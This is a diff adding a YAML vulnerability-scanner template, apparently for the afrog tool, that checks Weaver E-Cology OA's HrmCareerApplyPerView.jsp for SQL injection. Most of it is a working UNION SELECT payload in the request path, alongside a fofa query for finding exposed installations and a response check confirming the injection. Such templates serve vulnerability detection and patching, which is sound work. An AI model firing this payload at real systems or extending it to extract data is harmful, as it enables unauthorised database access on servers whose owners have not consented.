@@ -1,0 +1,22 @@
+id: ecology-hrmcareerapplyperview-sqli
+
+info:
+  name: 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微OA HrmCareerApplyPerView.jsp文件存在SQL注入漏洞，攻击者通过漏洞可以读取服务器敏感文件
+    fofa: app="泛微-协同办公OA"
+  tags: weaver,ecology,sqli
+  created: 2025/06/11
+
+set:
+  randstr: randLowercase(6)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),db_name(1),5,6,7
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(randstr)))
+expression: r0()
